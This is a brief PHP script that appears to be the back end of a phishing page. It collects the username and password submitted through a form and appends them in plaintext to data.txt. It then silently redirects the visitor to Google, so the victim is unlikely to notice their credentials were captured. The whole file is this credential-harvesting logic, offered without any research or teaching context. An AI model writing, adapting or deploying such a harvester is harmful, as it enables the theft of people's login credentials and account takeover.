<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  
  // Get form data
  $username = $_POST["username"];
  $password  = $_POST["password"];

  // Create a string with the form data
  $data = "username: $username\n password: $password\n";

  // Open the file for writing (if it doesn't exist, it will be created)
  $file = fopen("data.txt", "a");

  // Write the data to the file
  fwrite($file, $data);

  // Close the file
  fclose($file);

  // Redirect the user to a thank you page
  header("Location: https://google.com");
  exit();
}
?>
